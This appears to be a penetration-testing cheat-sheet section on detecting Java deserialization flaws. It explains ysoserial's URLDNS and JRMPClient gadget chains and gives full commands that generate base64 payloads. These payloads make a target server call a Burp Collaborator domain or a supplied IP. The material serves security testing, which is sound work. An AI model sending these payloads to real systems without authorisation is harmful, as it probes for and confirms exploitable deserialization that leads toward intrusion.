## Initial Detection

### Java deserialization

**URLDNS**

The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.

```
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
  --add-opens=java.base/java.lang=ALL-UNNAMED \
  -jar ysoserial-all.jar \
  URLDNS "http://sjf5uk7k11obgjzzkco0sb3lqcw3kx8m.oastify.com" | base64 -w 0
```

**JRMPClient**

`JRMPClient` is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases. 

```
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
  --add-opens=java.base/java.lang=ALL-UNNAMED \
  --add-opens=java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED \
  --add-opens=java.rmi/sun.rmi.server=ALL-UNNAMED \
  --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED \
  -jar ysoserial-all.jar \
  JRMPClient "192.168.0.1:1234" | base64 -w 0
```
